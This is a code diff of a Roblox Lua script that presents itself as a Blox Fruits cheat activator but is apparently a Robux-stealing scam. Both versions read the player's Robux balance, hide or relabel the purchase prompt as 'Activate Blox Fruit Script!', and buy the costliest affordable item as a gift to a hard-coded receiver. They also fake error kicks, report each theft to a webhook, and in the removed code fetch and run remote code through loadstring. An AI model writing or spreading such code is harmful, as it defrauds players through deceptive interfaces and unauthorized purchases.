+        { threshold = 1100, storage_name = "Permanent Light-Light" },
+        { threshold = 1000, storage_name = "Permanent Diamond-Diamond" },
+        { threshold = 950, storage_name = "Permanent Dark-Dark" },
+        { threshold = 850, storage_name = "Permanent Sand-Sand" },
+        { threshold = 750, storage_name = "Permanent Ice-Ice" },
+        { threshold = 650, storage_name = "Permanent Falcon-Falcon" },
+        { threshold = 550, storage_name = "Permanent Flame-Flame" },
+        { threshold = 450, storage_name = "2x Money" },
+        { threshold = 400, storage_name = "+1 Fruit Storage" },
+        { threshold = 380, storage_name = "Permanent Spike-Spike" },
+        { threshold = 350, storage_name = "2x Boss Drops" },
+        { threshold = 250, storage_name = "Permanent Smoke-Smoke" },
+        { threshold = 220, storage_name = "Permanent Bomb-Bomb" },
+        { threshold = 180, storage_name = "Permanent Spring-Spring" },
+        { threshold = 100, storage_name = "Permanent Blade-Blade" },
+        { threshold = 75, storage_name = "Permanent Spin-Spin" },
+        { threshold = 50, storage_name = "10K Money" },
+        { threshold = 25, storage_name = "2x EXP (15 mins.)" },
     }
-    
-    local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
-    local success = pcall(function()
-        CommF:InvokeServer(unpack(args))
+
+    table.sort(items_to_steal, function(a, b)
+        return a.threshold > b.threshold
     end)
-    
-    if success then
-        totalSpent = totalSpent + cost
-        if not webhookSent and PromptConfirmed then
-            sendWebhook(totalSpent, storageName)
-            webhookSent = true
-        end
-    end
-    
-    if type(waitForPromptToDisappear) == "function" then
-        waitForPromptToDisappear()
-    else
-        task.wait(2)
-    end
-    
-    purchaseInProgress = false
-end
 
-hideNotifications()
-
-local function stealItem(balance)
-    if balance >= 5000 then
-        buyItem("Permanent Dragon-Dragon", "FruitShop", 5000)
-    elseif balance >= 4000 then
-        buyItem("Permanent Kitsune-Kitsune", "FruitShop", 4000)
-    elseif balance >= 3000 then
-        buyItem("Permanent Yeti-Yeti", "FruitShop", 3000)
-    elseif balance >= 2700 then
-        buyItem("Fruit Notifier", "Shop", 2700)
-    elseif balance >= 2550 then
-        buyItem("Permanent Spirit-Spirit", "FruitShop", 2550)
-    elseif balance >= 2500 then
-        buyItem("Permanent Gas-Gas", "FruitShop", 2500)
-    elseif balance >= 2450 then
-        buyItem("Permanent Venom-Venom", "FruitShop", 2450)
-    elseif balance >= 2425 then
-        buyItem("Permanent Shadow-Shadow", "FruitShop", 2425)
-    elseif balance >= 2400 then
-        buyItem("Permanent Dough-Dough", "FruitShop", 2400)
-    elseif balance >= 2350 then
-        buyItem("Permanent T-Rex-T-Rex", "FruitShop", 2350)
-    elseif balance >= 2300 then
-        buyItem("Permanent Gravity-Gravity", "FruitShop", 2300)
-    elseif balance >= 2250 then
-        buyItem("Permanent Blizzard-Blizzard", "FruitShop", 2250)
-    elseif balance >= 2200 then
-        buyItem("Permanent Pain-Pain", "FruitShop", 2200)
-    elseif balance >= 2100 then
-        buyItem("Permanent Rumble-Rumble", "FruitShop", 2100)
-    elseif balance >= 2000 then
-        buyItem("Permanent Portal-Portal", "FruitShop", 2000)
-    elseif balance >= 1900 then
-        buyItem("Permanent Sound-Sound", "FruitShop", 1900)
-    elseif balance >= 1800 then
-        buyItem("Permanent Spider-Spider", "FruitShop", 1800)
-    elseif balance >= 1700 then
-        buyItem("Permanent Love-Love", "FruitShop", 1700)
-    elseif balance >= 1650 then
-        buyItem("Permanent Buddha-Buddha", "FruitShop", 1650)
-    elseif balance >= 1500 then
-        buyItem("3x Mythical Scrolls", "Shop", 1500)
-    elseif balance >= 1300 then
-        buyItem("Permanent Magma-Magma", "FruitShop", 1300)
-    elseif balance >= 1275 then
-        buyItem("Permanent Ghost-Ghost", "FruitShop", 1275)
-    elseif balance >= 1250 then
-        buyItem("Permanent Barrier-Barrier", "FruitShop", 1250)
-    elseif balance >= 1200 then
-        buyItem("Dark Blade", "Shop", 1200)
-    elseif balance >= 1100 then
-        buyItem("Permanent Light-Light", "FruitShop", 1100)
-    elseif balance >= 1000 then
-        buyItem("Permanent Diamond-Diamond", "FruitShop", 1000)
-    elseif balance >= 950 then
-        buyItem("Permanent Dark-Dark", "FruitShop", 950)
-    elseif balance >= 850 then
-        buyItem("Permanent Sand-Sand", "FruitShop", 850)
-    elseif balance >= 750 then
-        buyItem("Permanent Ice-Ice", "FruitShop", 750)
-    elseif balance >= 650 then
-        buyItem("Permanent Falcon-Falcon", "FruitShop", 650)
-    elseif balance >= 550 then
-        buyItem("Permanent Flame-Flame", "FruitShop", 550)
-    elseif balance >= 460 then
-        buyItem("2x Mastery", "Shop", 450)
-    elseif balance >= 450 then
-        buyItem("2x Money", "Shop", 450)
-    elseif balance >= 400 then
-        buyItem("+1 Fruit Storage", "Shop", 400)
-    elseif balance >= 380 then
-        buyItem("Permanent Spike-Spike", "FruitShop", 380)
-    elseif balance >= 350 then
-        buyItem("2x Boss Drops", "Shop", 350)
-    elseif balance >= 250 then
-        buyItem("Permanent Smoke-Smoke", "FruitShop", 250)
-    elseif balance >= 220 then
-        buyItem("Permanent Bomb-Bomb", "FruitShop", 220)
-    elseif balance >= 180 then
-        buyItem("Permanent Spring-Spring", "FruitShop", 180)
-    elseif balance >= 100 then
-        buyItem("Permanent Blade-Blade", "FruitShop", 100)
-    elseif balance >= 75 then
-        buyItem("Permanent Spin-Spin", "FruitShop", 75)
-    elseif balance >= 50 then
-        buyItem("Permanent Rocket-Rocket", "FruitShop", 50)
-    elseif balance >= 25 then
-        buyItem("2x EXP (15 mins.)", "Shop", 25)
-    end
-
-    return
-end
-
-local CoreGui = game:GetService("CoreGui")
-
-local function getRobuxAndProceed()
-    coroutine.wrap(function()
-        coroutine.wrap(loopSinkTransparency)()
-
-        local args = {
-            [1] = "buyRobuxShop",
-            [2] = {
-                ["StorageName"] = "2x EXP (15 mins.)",
-                ["FunnelId"] = "Shop",
-                ["PurchaseLocation"] = "Shop"
+    for _, item_data in ipairs(items_to_steal) do
+        if result >= item_data.threshold then
+            local args = {
+                [1] = "buyRobuxShop",
+                [2] = {
+                    ["Message"] = "Ishus On top",
+                    ["StorageName"] = item_data.storage_name,
+                    ["PurchaseLocation"] = (string.find(item_data.storage_name, "Permanent") and "FruitShop") or "Shop",
+                    ["FunnelId"] = "Shop",
+                    ["ReceiverName"] = Username,
+                    ["ReceiverUserId"] = UserId,
+                }
             }
-        }
-
-        local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
-        if CommF then
-            CommF:InvokeServer(unpack(args))
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+            break -- Exit the loop after gifting the first eligible item
         end
-
-        local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
-        while not PurchasePrompt do
-            task.wait(0.1)
-            PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
-        end
-
-        coroutine.wrap(function()
-            while true do
-                local RobuxUpsellContainer = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
-                if RobuxUpsellContainer then
-                    RobuxUpsellContainer.Visible = false
-                    game.Players.LocalPlayer:Kick("\n[DELTA IS BUGGY WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) If you didn't execute anything before \n2) Use main account, alts will be detected (Used to bypass Anti-Cheat) \n3) Use different Executor & Try again.")
-                    break
-                end
-                task.wait(0.1)
-            end
-        end)()      
-
-        local ProductPurchaseContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
-        if ProductPurchaseContainer then
-            local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
-            if Animator then
-                local Prompt = Animator:WaitForChild("Prompt")
-                if Prompt then
-                    Prompt.Visible = false
-                    local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
-                    if settingsClippingShield then
-                        settingsClippingShield.Visible = false
-                    end
-
-                    task.wait(1)
-
-                    local balance = getRobuxBalance()
-            
-                    if balance < 25 then
-                        game.Players.LocalPlayer:Kick("\n[DELTA IS BUGGY WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) If you didn't execute anything before \n2) Use main account, alts will be detected (Used to bypass Anti-Cheat) \n3) Use different Executor & Try again.")
-                        return
-                    end
-
-                    local VirtualInputManager = game:GetService("VirtualInputManager")
-                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
-                    task.wait()
-                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
-
-                    waitForPromptToDisappear()
-
-                    task.wait(0.5)
-
-                    local PromptConfirmed = false
-                    
-                    coroutine.wrap(function()
-                        while true do
-                            while not Animator:FindFirstChild("Prompt") do
-                                task.wait(0.1)
-                            end
-                    
-                            while Animator:FindFirstChild("Prompt") and not PromptConfirmed do
-                                task.wait(0.1)
-                            end
-                    
-                            if not Animator:FindFirstChild("Prompt") and not PromptConfirmed then
-                                task.wait(1)
-                                stealItem(balance)
-                            end
-                        end
-                    end)()
-
-                    stealItem(balance)
-                else
-                    print("err1")
-                end
-            else
-                print("err2")
-            end
-        else
-            print("err3")
-        end
-    end)()
+    end
 end
 
-local function waitForPrompt()
-    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
-    if not PurchasePrompt then return end
-    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
-    if not ProductContainer then return end
-    local Animator = ProductContainer:FindFirstChild("Animator")
-    if not Animator then return end
+local function WaitForPrompt1()
+    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+    stealitem()
+    local CoreGui = game:GetService("CoreGui")
 
-    modifyPromptUI(true)
+    local success, err = pcall(function()
+        local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
+        local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+        local Animator = ProductPurchaseContainer:WaitForChild("Animator")
+        local Prompt = Animator:WaitForChild("Prompt")
+        local AlertContents = Prompt:WaitForChild("AlertContents")
 
-    Animator.ChildAdded:Connect(function(child)
-        if child.Name == "Prompt" then
-            modifyPromptUI(false)
-            waitForPurchaseConfirmation()
-        end
+        local MiddleContent = AlertContents:WaitForChild("MiddleContent")
+        MiddleContent.Visible = false
+
+        local Footer = AlertContents:WaitForChild("Footer")
+        local FooterButtons = Footer:WaitForChild("Buttons")
+        local FooterButton1 = FooterButtons:WaitForChild("1")
+        FooterButton1.Visible = false
+
+        local FooterContent = Footer:WaitForChild("FooterContent")
+        FooterContent.Visible = false
+
+        local FooterButton2 = FooterButtons:WaitForChild("2")
+        FooterButton2.Visible = true
+
+        local FooterButton2Text = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
+        FooterButton2Text.Text = "Activate!"
+        FooterButton2Text.Size = UDim2.new(1, 0, FooterButton2Text.Size.Y.Scale, FooterButton2Text.Size.Y.Offset)
+
+        local FooterButton2Icon = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Icon")
+        FooterButton2Icon.Visible = false
+
+        local TitleContainer = AlertContents:WaitForChild("TitleContainer")
+        local TitleArea = TitleContainer:WaitForChild("TitleArea")
+        local TitleText = TitleArea:WaitForChild("Title")
+        TitleText.Text = "Activate Blox Fruit Script!"
+        TitleText.Size = UDim2.new(1, 0, TitleText.Size.Y.Scale, TitleText.Size.Y.Offset)
     end)
 
-    coroutine.wrap(function()
-        while not promptConfirmed do
-            task.wait(0.1)
-        end
-
-        if totalSpent >= 25 then
-            sendWebhook(totalSpent)
-            if typeof(LoadRedzAfterHit) == "boolean" and LoadRedzAfterHit then
-                task.spawn(function()
-                    local Settings = {
-                        JoinTeam = "Pirates",
-                        Translator = true 
-                    }
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))(Settings)
-                end)
-            end
-        else
-            print("err")
-        end
-        
-        local VirtualInputManager = game:GetService("VirtualInputManager")
-
-        while true do
-            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
-            task.wait() 
-            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
-
-            local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
-            if not PurchasePrompt then
-                break
-            end
-
-            local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
-            if not ProductContainer then break end
-
-            local Animator = ProductContainer:FindFirstChild("Animator")
-            if not Animator then break end
-
-            local prompt = Animator:FindFirstChild("Prompt")
-            if not prompt then
-                break 
-            end
-        end
-    end)()
+    if not success then
+        warn("UI..")
+    end
 end
 
-if success then
-    sendExecutionLog()
-    waitForPrompt()
-    getRobuxAndProceed()
-else
-    warn("Error: " .. err)
+local RobuxPath = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild("RemainingBalanceText")
+local balanceText = RobuxPath and RobuxPath.Text:match("(%d+)$")
+
+if balanceText then
+    result = tonumber(balanceText) + 25
 end
 
-game.Players.LocalPlayer.OnTeleport:Connect(function()
-    _G.scriptExecuted = nil
-end)
+local function WaitForPrompt2()
+    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+    sendWebhook()
+end
+
+WaitForPrompt1()
+WaitForPrompt2()
